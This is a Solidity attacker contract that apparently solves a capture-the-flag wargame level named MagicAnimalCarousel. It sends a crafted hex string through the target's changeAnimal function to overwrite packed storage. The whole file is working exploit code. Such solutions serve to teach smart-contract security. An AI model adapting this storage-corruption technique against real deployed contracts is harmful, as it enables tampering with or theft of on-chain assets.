// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMagic {
    function setAnimalAndSpin(string calldata animal) external ;
    function changeAnimal(string calldata animal, uint256 crateId) external;
}
contract MagicAnimalCarouselAttacker{
    function attack(address targetAddress) external {
        IMagic(targetAddress).setAnimalAndSpin("cow");
        string memory exploitString = string(abi.encodePacked(hex"10000000000000000000FFFF"));
        IMagic(targetAddress).changeAnimal(exploitString,1);
    }
}